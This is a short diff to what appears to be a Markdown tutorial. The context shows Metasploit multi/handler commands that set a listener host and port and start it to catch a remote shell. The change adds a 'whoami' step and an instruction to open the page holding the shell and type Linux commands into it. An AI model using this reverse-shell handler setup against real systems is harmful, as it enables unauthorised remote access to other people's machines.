@@ -148,6 +148,8 @@ msf exploit(multi/handler) > set LHOST 192.168.1.159
 msf exploit(multi/handler) > set LPORT 55555
 # Output: LPORT => 55555
 msf exploit(multi/handler) > exploit
+#
+$ whoami
 ```
 
 Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.
